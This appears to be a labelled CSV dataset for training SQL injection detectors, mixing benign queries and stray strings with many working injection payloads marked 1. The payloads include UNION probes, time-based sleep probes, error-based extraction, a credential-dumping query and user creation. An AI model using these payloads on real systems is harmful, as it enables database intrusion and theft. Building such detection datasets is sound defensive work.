Query,Label
SELECT COUNT ( DISTINCT yes )  FROM guide,0
SELECT * FROM bend  WHERE own NOT LIKE '[needle]%',0
SELECT * FROM with WHERE depth = 'wore'  OR feel = 'red',0
"SELECT Employees.affect, COUNT ( Orders.coldID )  AS jarFROM    ( OrdersINNER JOIN amount ON Orders.symbolID  =  Employees.silkID )",0
SELECT COUNT ( spoken )  FROM explanation,0
"logroo, 98, 5-d",0
"-7776'  )   OR 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleCt   (  caSe WhEN   (  5023  =  5023  )   THEN 1 eLsE 0 enD  )   frOM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anD   (  'ihof'  =  'ihof",1
seLEcT   (  cAse wheN   (  5423  =  7706  )   tHEn 5423 elsE casT  (  1 aS int  )  /  (  seLEcT 0 FRoM dual  )   END  )   FRoM dual--,1
"UPDATE very SET anywhere =  'pressure', City =  'couple' WHERE pay =  but",0
SELECT TOP 3 * FROM suit WHERE seen = 'land' SELECT * FROM such,0
retiendas,0
alobras,0
28530,0
ull colmenares,0
SELECT AVG ( raise )  FROM declared  SELECT SUM ( tongue ),0
"1'   )    )    AS nlfq WHERE 3410  =  3410 oR extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  selEcT   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
"madrid, 27",0
"-5360' WHere 8178  =  8178 uNIon aLL seleCT 8178,8178,8178--",1
cerpa oitavn,0
SELECT * FROM port WHERE Price NOT BETWEEN 10 AND 20,0
marcos esculta,0
"1""  )   union AlL SELeCT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
SELECT TOP 3 * FROM greatest WHERE western = 'brave' SELECT * FROM record,0
1'   )    )     )   UNiOn aLL SELeCT nuLl#,1
"SELECT duck, nearby+ ', ' + quiet+ ' ' + wing+ ', ' + vessels AS engineer  FROM wherever",0
"1%' Or ChAr  (  68  )  ||ChAr  (  69  )  ||ChAr  (  97  )  ||ChAr  (  85  )    =  regexp_substring  (  repeat  (  riGHt  (  ChAr  (  5389  )  ,0  )  ,5000000000  )  ,NUll  )   aND '%'  =  '",1
SELECT * FROM rather 3 SELECT * FROM prove,0
SELECT * FROM harbor FETCH FIRST 50 PERCENT ROWS ONLY,0
"""^""",1
-2316'   )    )     )   Or 8519  =  6010,1
SELECT AVG ( aware ) FROM ship,0
SELECT * FROM garden WHERE bear NOT LIKE '[hill]%',0
SELECT AVG ( Price ) FROM sail,0
"SELECT Employees.sugar, COUNT ( Orders.secretID )  AS situationFROM    ( OrdersINNER JOIN thrown ON Orders.morningID  =  Employees.butID )",0
or '' ',1
1 WHere 3744  =  3744,1
SELECT * FROM business WHERE shelter NOT LIKE 'feathers%',0
"-4925"" uniOn aLl SelECT 5686,5686,5686,5686,5686,5686,5686#",1
SELECT * FROM did WHERE body = 'pound'  AND  ( pour = 'original' OR tank = 'course' ),0
elda,0
SELECT * FROM practical  WHERE every NOT LIKE '[calm]%',0
"sELECT count  (  *  )   fROm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ANd    (    (     (  ""ymss""  =  ""ymss",1
-8369  )   wheRE 7234  =  7234 ordeR by 1--,1
1'   )    )    as sjzf whERe 9997  =  9997 And 4193  =  5408,1
SELECT * FROM automobile WHERE getting = 'move'  OR development = 'paid',0
"SELECT direction,engine FROM kitchen WHERE want = 'yes' UNION SELECT shut, even FROM behavior",0
SELECT DISTINCT darkness FROM lovely,0
SELECT MIN ( carefully )  AS dull FROM remarkable,0
64526656h,0
SELECT COUNT ( red )  FROM at,0
"selECt * FROM users wHEre id  =  11<1# UNiOn selECt 1,version  (    )   -- 1",1
1'  )   AS fxid whErE 5926  =  5926,1
"1""   )    )    aNd CHAR  (  111  )  ||CHAR  (  77  )  ||CHAR  (  121  )  ||CHAR  (  88  )    =  regexp_substring  (  repeat  (  LEFT  (  crypt_key  (  CHAR  (  65  )  ||CHAR  (  69  )  ||CHAR  (  83  )  ,NUll  )  ,0  )  ,500000000  )  ,NUll  )   aNd    (    (   ""vcjt"" LIkE ""vcjt",1
6432,0
"SELECT column_name ( s )  FROM realize,needed",0
woolgar@awat.gov,0
SELECT * FROM rhyme WHERE slipped = 'lucky' FETCH FIRST 3 ROWS ONLY,0
"1 aNd 8514  =    (  SElECT count  (  *  )   FrOM domain.domains As t1,domain.columns As t2,domain.tables As t3  )  # miji",1
"1""  )   WheRe 9545  =  9545 anD 9198  =  9198--",1
SELECT safety FROM grow UNION SELECT tales FROM deal ORDER BY thank,0
buitrago pontigo,0
jabbari,0
"1"" rlike sleEp  (  5  )",1
SELECT * FROM prove,0
dotan,0
-5286' oR 6783  =  1233,1
"1"" WHeRe 7232  =  7232   (  SeLecT   (  CaSE whEN   (  5451  =  5451  )   THen regexp_substring  (  repeat  (  rIgHT  (  cHAR  (  5451  )  ,0  )  ,500000000  )  ,NUlL  )   ElSe cHAR  (  108  )  ||cHAR  (  76  )  ||cHAR  (  112  )  ||cHAR  (  116  )   eNd  )   From information_schema.system_users  )  --",1
1   )    )    as quap WHeRE 7625  =  7625,1
SELECT * FROM observe WHERE golden = 'various'  AND  ( character = 'gain' OR ball = 'dirty' ),0
"1%"" Or elt  (  5873  =  5873,slEep  (  5   )    )   #",1
"pasaje cox 194, 5?f",0
; begin DEClARE @var varchar  (  8000  )   SeT @var  =  ':' select @var  =  @var+'+login+'/'+password+' ' FROM users wHEre login >,1
1'  )   WhERe 3187  =  3187 ORdeR by 1#,1
9043,0
SELECT * FROM mixture  WHERE opportunity NOT LIKE '[mother]%',0
SELECT * FROM hidden WHERE doubt = 'fun'  AND City = 'furniture',0
bnrinfo,0
cha$9i74r0,0
"SElect dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   FROm dual and 'lckw'  =  'lckw",1
17493,0
4077,0
"1"" wHErE 4345  =  4345 AnD 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  cAse WhEn   (  4386  =  4386  )   tHEN 1 ElSe 0 END  )   froM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
1%'   )    )     ),1
SELECT MIN ( whose )  AS whenever FROM sunlight,0
SELECT COUNT ( cloud ) FROM child,0
"1"" whEre 4808  =  4808 UNiON aLl SEleCT NUlL,NUlL,NUlL,NUlL,NUlL,NUlL,NUlL#",1
"1'  )   UNioN ALL sElEct NUlL,NUlL,NUlL,NUlL,NUlL,NUlL,NUlL,NUlL,NUlL--",1
-8015  )   wHeRE 9808  =  9808 oR 9323  =  9323#,1
5.5584E+15,0
"1""   )    )     )   anD 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
SELECT equally FROM reader UNION SELECT gasoline FROM bread ORDER BY boat,0
"SELECT * FROM farm WHERE weight IN  ( 'own', 'herd', 'rabbit' )",0
"1'   )    )     )   aND Char  (  107  )  ||Char  (  121  )  ||Char  (  97  )  ||Char  (  80  )    =  regexp_substring  (  repeat  (  LefT  (  crypt_key  (  Char  (  65  )  ||Char  (  69  )  ||Char  (  83  )  ,NuLL  )  ,0  )  ,500000000  )  ,NuLL  )  --",1
"SELECT oxygen AS along, fence AS [instead]  FROM food",0
"-9574%'   )    )    UNiON All SEleCT 5645,5645,5645,5645,5645,5645,5645--",1
3.6585E+15,0
nieva de cameros,0
1'   )    )     )   rlike   (  SelEct * FROM   (  SelEct  (  SlEep  (  5   )    )     )  sgvo  )   and    (    (     (  'npzh'  =  'npzh,1
SELECT MIN ( interest )  AS flat FROM planet,0
israel_piggot@joyclub.pe,0
"1'   )    )    AS sojl WHERE 8710  =  8710 Or chAR  (  119  )  ||chAR  (  100  )  ||chAR  (  99  )  ||chAR  (  121  )    =  regexp_substring  (  repeat  (  RiGHt  (  chAR  (  1441  )  ,0  )  ,5000000000  )  ,nUlL  )  --",1
1%' aNd SLEEp  (  5  )   aNd '%'  =  ',1
SELECT COUNT ( DISTINCT kitchen )  FROM tired,0
"1'   )    )     )   AND row  (  6237,7469  )  >  (  SelEct count  (  *  )  ,concat  (  0x7171706a71,  (  SelEct   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x froM   (  SelEct 5192 UNioN SelEct 3785 UNioN SelEct 3931 UNioN SelEct 7158  )  a GRouP bY x  )   AND    (    (     (  'zxhn' Like 'zxhn",1
1'||  (  sELECt 'iuud' wherE 3687  =  3687,1
"1%""   )    )    And 9254  =    (  SeLEct count  (  *  )   FroM rdb$fields As t1,rdb$types As t2,rdb$collations As t3,rdb$functions As t4  )  --",1
SELECT AVG ( knife ) FROM characteristic,0
"-9848' UnIOn ALl sELECt 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",1
SELECT * FROM population WHERE ground BETWEEN '1996-07-01' AND '1996-07-31',0
rudie@deuxmanagement.jo,0
1'   )    )     )   aNd   (  1685  =  2985  )  *2985 aNd    (    (     (  'rzwb'  =  'rzwb,1
SELECT * FROM heart FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM jar,0
"SELECT Orders.keyrID, Employees.smile, Employees.managed FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.bridgeID ORDER BY Orders.airplaneID",0
lilien@aprendeaestudiar.lt,0
"c/ virgen de la almudena, 61 12?c",0
SELECT * FROM printed WHERE wing LIKE '%badly%',0
zahn,0
SELECT AVG ( trip )  FROM relationship  SELECT SUM ( wild ),0
"1' anD updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  sELEct   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   anD 'kudh' LIKE 'kudh",1
"1%"" ANd 8635  =    (  SeLECT count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT AVG ( Price ) FROM look,0
1'   )    )     )   And 3754  =    (  sELect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sELect   (  caSe WHen   (  3754  =  3754  )   ThEN 1 elSe 0 END  )   fRoM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fRoM dual  )   And    (    (     (  'ykjs' like 'ykjs,1
-8553'+  (  seLeCt adko WherE 1750  =  1750 UNiOn All seLeCt 1750#,1
SELECT * FROM native FETCH FIRST 50 PERCENT ROWS ONLY,0
sikes-jeans@923.mv,0
"INSERT INTO balance  ( meant, gravity, daily )  VALUES  ( 'let', 'soldier', 'chief' )",0
SELECT * FROM subject WHERE NOT pot = 'shape'  AND NOT receive = 'lake',0
padiernos,0
belia,0
DEClarE @s varchar  (  200  )   sEleCT @s   =   0x77616974 ...,1
ilsup,0
"1'+  (  sElEct jrmz wHerE 4762  =  4762 AND elt  (  9588  =  9794,9794   )    )   +'",1
guillen,0
"1""   )    )    AND 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SElEct   (  caSE WhEN   (  4386  =  4386  )   theN 1 ELse 0 end  )   frOm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    AND    (    (   ""bfko""  =  ""bfko",1
"SELECT desert, bell+ ', ' + immediately+ ' ' + fell+ ', ' + stairs AS lungs  FROM lift",0
19461,0
"1""   )    )     )   AnD updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  seLecT   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   AnD    (    (     (  ""eslj"" lIkE ""eslj",1
"1%""   )    )     )   oR 8156  =    (  SeLecT count  (  *  )   FroM generate_series  (  1,5000000   )    )   --",1
chimenea,0
DELETE FROM send,0
strucak@cortell.cat,0
SELECT * FROM measure WHERE too = 'beginning' FETCH FIRST 3 ROWS ONLY,0
"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  BeNcHmarK  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",1
1.22869E+15,0
SELECT * FROM separate,0
1'+  (  SeLECT hrgu whERe 9587  =  9587,1
26%,1
"SELECT * FROM express ORDER BY independent ASC, love DESC",0
SELECT AVG ( Price ) FROM skill,0
"1 UNiOn all sEleCT nuLl,nuLl,nuLl,nuLl,nuLl,nuLl,nuLl,nuLl--",1
SELECT AVG ( raw ) FROM bigger SELECT SUM ( volume ),0
"1"" ANd SlEeP  (  5  )  #",1
"SELECT hiddenID AS ID, aid AS fell FROM bet",0
alicanto,0
SELECT progress ( s )  FROM important SELECT clay FROM tell,0
SELECT * FROM Customers   WHERE Country IN  ( SELECT Country FROM Suppliers ) ;,0
50615,0
"1'+  (  sElEct sxco wheRe 1623  =  1623 UnIon aLL sElEct nuLL,nuLL--",1
"SELECT * FROM examine WHERE hello IN  ( 'shoot', 'happy', 'ball' )",0
1  )   anD 2853  =  cAsT   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selECt   (  CAsE wHeN   (  2853  =  2853  )   tHeN 1 eLSE 0 enD   )    )   ::TExt||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    aS numeric  )   anD   (  9932  =  9932,1
"SELECT COUNT ( pick ) , rope FROM final BY mistake",0
SELECT * FROM join,0
"1'   )    )     )   or 8421  =    (  SeLEcT count  (  *  )   fROm generate_series  (  1,5000000   )    )    anD    (    (     (  'bmzj' LIke 'bmzj",1
"1%"" anD 3754  =    (  SeLeCt upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SeLeCt   (  casE WhEn   (  3754  =  3754  )   THen 1 ELSe 0 ENd  )   fRoM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fRoM dual  )   anD ""%""  =  """,1
SELECT * FROM remarkable WHERE army = 'face'  AND City = 'massage',0
1'+  (  SeLect rdwb wHeRE 2498  =  2498 aNd 3429  =  7639--,1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82f1dbb24' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
-9847%'   )    )     )   OR 3440  =  casT   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  seLect   (  case WheN   (  3440  =  3440  )   THen 1 ELSE 0 End   )    )   ::TExt||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    AS numeric  )   aND    (    (     (  '%'  =  ',1
basilia,0
SELECT COUNT ( method )  FROM fort,0
6.92E+15,0
SELECT * FROM  ( SELECT excited FROM principle ),0
SELECT * FROM frequently WHERE interior = 'include'  AND  ( question = 'luck' OR earn = 'quiet' ),0
SELECT * FROM compass ORDER BY available,0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'wp_theme' )  AND t.name IN  ( 'houzez-child' )",0
"-6626%""  )   oR 1744  =  5292 AnD   (  ""%""  =  """,1
"1' And 6414  =    (  selecT count  (  *  )   FROM rdb$fields AS t1,rdb$types AS t2,rdb$collations AS t3,rdb$functions AS t4  )",1
SELECT * FROM chain WHERE education = 'continued' LIMIT 3,0
UPDATE in SET sound = 'line'WHERE hardly = 'whale',0
1   )    )    As ehlg WHeRe 6340  =  6340,1
SELECT paint,0
"1234 "" AND 1  =  0 UNioN aLL SElECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
SELECT MIN ( purple )  AS collect FROM luck,0
68252027x,0
"1""  )   AS xaye wHerE 5343  =  5343 aNd 4355  =  7475#",1
"1' And 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SELect   (  caSE WhEn   (  6055  =  6055  )   TheN 1 ELsE 0 enD  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )",1
"1'  )   AnD updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  SeLECT   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )",1
SELECT rubber ( s )  FROM shoot UNION ALL,0
"SELECT leg,group,travel FROM shelter LEFT JOIN Orders ON chest.solidID =  could.frozen ORDER BY fear.so",0
"-2568""  )   or   (  8459  =  8459  )  *4906 anD   (  ""exyw""  =  ""exyw",1
"SELECT FIND_IN_SET ( ""q"", ""s,q,l"" ) ;",0
30827206f,0
"SELECT surfaceID AS ID, should AS immediately FROM afternoon",0
"1"" rlike   (  sElEcT   (  CAse WHEN   (  3711  =  3313  )   tHen 1 elsE 0x28 END   )    )    and ""iqlh"" LIke ""iqlh",1
"SelecT * FROm users WhEre id  =  1 -1<@ UnioN SelecT 1,vERSiOn  (    )   -- 1",1
"SELECT * FROM for WHERE silence NOT IN  ( 'rise', 'roar', 'one' )",0
91650654r,0
knio,0
1' WhEre 9602  =  9602,1
viana de jadraque,0
SELECT * FROM grade FETCH FIRST 50 PERCENT ROWS ONLY,0
-7230'  )   Or 2724 In    (    (   CHar  (  113  )  +CHar  (  113  )  +CHar  (  112  )  +CHar  (  106  )  +CHar  (  113  )  +  (  SELect   (  CasE WhEn   (  2724  =  2724  )   ThEN CHar  (  49  )   eLse CHar  (  48  )   End   )    )   +CHar  (  113  )  +CHar  (  122  )  +CHar  (  118  )  +CHar  (  122  )  +CHar  (  113   )    )     )   AnD   (  'khtc'  =  'khtc,1
"-9988%"" Or elt  (  1032  =  1032,3623  )   aNd ""%""  =  """,1
DELETE FROM Customers;,0
"infantes de carrion, 122",0
"1   )    )     )   UniON ALl seLEct NUll,NUll,NUll,NUll,NUll,NUll,NUll,NUll#",1
"1'  )   As saqp WHeRe 6612  =  6612 unIoN aLL Select nUll,nUll,nUll,nUll,nUll,nUll,nUll--",1
"-1033 uNiOn aLL seLECt 8731,8731,8731,8731,8731,8731--",1
SELECT * FROM calm WHERE past IN  ( SELECT system FROM develop ),0
"1""  )   wHere 4660  =  4660 OR 5286  =    (  sELect count  (  *  )   fROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM cowboy WHERE effort = 'never' LIMIT 3,0
horalek,0
SELECT wide ( s )  FROM west,0
SELECT * FROM charge WHERE vessels BETWEEN property09/01/1996hearing AND coffee15/31/1996year,0
1.78478E+15,0
"1%'   )    )     )   ANd updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  SelEcT   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   ANd    (    (     (  '%'  =  '",1
"SELECT quick AS impossible, chance AS [ability]  FROM breakfast",0
SELECT * FROM excitement WHERE meat BETWEEN scientific09/01/1996above AND mix15/31/1996step,0
SELECT fort ( s )  FROM main LEFT JOIN,0
cos6rio,0
"-8735'   )    )    unIoN All SElECT 3262,3262,3262--",1
ayate,0
clav6ria,0
SELECT youth ( s )  FROM tape UNION,0
1'  )   AND   (  3020  =  3020  )  *6703 AND   (  'botl' lIKE 'botl,1
diafragmar,0
vallado oliveras,0
sangres,0
"INSERT INTO which ( mile, friend, finish, monkey, word, then )  VALUES  ( 'against', 'recently'. gray', 'sum', 'stock', 'fastened', 'go' )",0
2.57E+15,0
"1'   )    )     )   ANd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  SeleCt   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    ANd    (    (     (  'cfhi' LIke 'cfhi",1
nadav6,0
"1%""   )    )     )   oR 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   anD    (    (     (  ""%""  =  """,1
"SELECT * FROM mouth WHERE teach BETWEEN ""wish"" AND    ""pick""",0
san salvador,0
"UPDATE won SET known =  'prepare', City =  'far' WHERE dust =  terrible",0
1  )   and   (  sElEct * fROM   (  sElEct  (  SLeep  (  5   )    )     )  gcrr  )  #,1
SELECT * FROM making WHERE him  BETWEEN 10 AND 20,0
"SELECT cast, wealth+ ', ' + neighborhood+ ' ' + thousand+ ', ' + worried AS upper  FROM sharp",0
03621656f,0
1' IN boolean mode  )   oR 6793  =    (  selecT 6793 froM pg_sleep  (  5   )    )   #,1
"seleCT * from users wHERe id  =  1 or $ .  =  1 UNioN seleCT 1,@@vERsIon -- 1",1
"SELECT ADDTIME ( ""09:34:21.000001"", ""2:10:5.000003"" ) ;",0
"-2153'||  (  SELECt 'sofs' wHerE 4126  =  4126 UNIOn alL SELECt 4126,4126,4126,4126,4126#",1
z5r1174osa,0
"SELECT * FROM primitive WHERE coming IN  ( 'either', 'draw', 'queen' )",0
"1""   )    )    rlike sLeEP  (  5  )  #",1
"SELeCt count  (  *  )   FROM domain.domains As t1,domain.columns As t2,domain.tables As t3 aND   (  ""pxbk"" lIKe ""pxbk",1
"-6294"" UNiOn aLl SElecT 9921,9921,9921,9921,9921,9921--",1
1%'   )    )    rlike   (  SElEcT   (  cAsE WHEn   (  6094  =  7893  )   ThEN 1 ELsE 0x28 end   )    )    anD    (    (   '%'  =  ',1
"SELECT dirt, three, love FROM blood WHERE spirit  IS NULL",0
"calle artigako haritza, s/n 8?d",0
leandro,0
SELECT COUNT ( DISTINCT larger )  FROM spite,0
SELECT Count ( * )  AS season,0
"SEleCT liKe  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    AnD   (  'dthp'  =  'dthp",1
SELECT COUNT ( DISTINCT breathe )  FROM myself,0
-6222   )    )    oR 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SElEct   (  CAse whEN   (  4493  =  4493  )   Then 1 ELse 0 EnD  )   From dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    And    (    (   3230  =  3230,1
0a0t4d2r,0
1'+  (  sELeCt 'drqj' WheRE 1246  =  1246,1
20100,0
1'  )   AS jdmh wHEre 6175  =  6175 rlike Sleep  (  5  )  #,1
"1""  )   AS ubva wHeRe 6369  =  6369 anD 8514  =    (  SelEct count  (  *  )   from domain.domains AS t1,domain.columns AS t2,domain.tables AS t3  )  --",1
"1'   )    )     (  sElecT   (  case when   (  4587  =  4587  )   ThEn regexp_substring  (  repeat  (  LEFt  (  crypt_key  (  CHAR  (  65  )  ||CHAR  (  69  )  ||CHAR  (  83  )  ,nuLL  )  ,0  )  ,500000000  )  ,nuLL  )   ELSE CHAR  (  76  )  ||CHAR  (  65  )  ||CHAR  (  102  )  ||CHAR  (  72  )   end  )   FROm   (  VAlUEs  (  0   )    )     )   aND    (    (   'qeet'  =  'qeet",1
SELECT * FROM spin WHERE NOT system = 'allow'  AND NOT law = 'current',0
SELECT nature ( s FROM yesterday RIGHT JOIN,0
"UPDATE appearance SET forget =  'gasoline', City =  'properly' WHERE usual =  enemy",0
c/ doctores lasso simarro 30,0
"SELECT individual, decide, milkFROM deeply WHERE citizen  IS NOT NULL",0
48di48l92,0
"1""  )   wherE 6632  =  6632 OR 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
1  )   WHErE 1079  =  1079,1
SELECT MIN ( fire )  AS finish FROM longer,0
"1"" WheRE 2483  =  2483",1
"1  )   As bfuy WherE 3879  =  3879 aNd ChAR  (  107  )  ||ChAR  (  121  )  ||ChAR  (  97  )  ||ChAR  (  80  )    =  regexp_substring  (  repeat  (  leFT  (  crypt_key  (  ChAR  (  65  )  ||ChAR  (  69  )  ||ChAR  (  83  )  ,NuLL  )  ,0  )  ,500000000  )  ,NuLL  )  --",1
"1""   )    )     )   or 8384  =  liKE  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    ANd    (    (     (  ""nevr"" liKE ""nevr",1
cREATe uSER name identified bY pass123 temporary tablespace temp default tablespace users;,1
"1   )    )    or 8466  =  BeNCHMARK  (  5000000,md5  (  0x694a4745   )    )    aNd    (    (   8189  =  8189",1
moskuna@sitcpla.ye,0
SELECT * FROM excitement FETCH FIRST 50 PERCENT ROWS ONLY,0
